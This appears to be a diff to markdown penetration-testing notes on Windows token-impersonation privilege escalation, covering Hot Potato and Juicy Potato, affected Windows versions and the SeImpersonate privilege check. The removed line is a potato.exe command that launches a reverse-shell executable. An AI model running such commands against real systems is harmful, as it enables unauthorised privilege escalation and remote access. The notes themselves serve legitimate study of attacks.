@@ -44,5 +44,7 @@
 ## Token Impersonation
 ###  Potatoes
 * [ ] [[Hot Potato|Hot potato]] 
-* `.\potato.exe -ip <local ip> -cmd "C:\PrivEsc\reverse.exe" -enable_httpserver true -enable_defender true -enable_spoof true -enable_exhaust true`
-* [ ] 
+*` Windows 7, 8, early versions of Windows 10, win Server 2008, and Server 2012. and their server counterparts`
+* [ ] [[juicypotato|Juicy Potato]] 
+*  `meterpreter> whoami /priv` ->  1. be instantiable by the current user, normally a “service user” which has impersonation privileges ,`SeImpersonate` or `SeAssignPrimaryToken` privileges
+
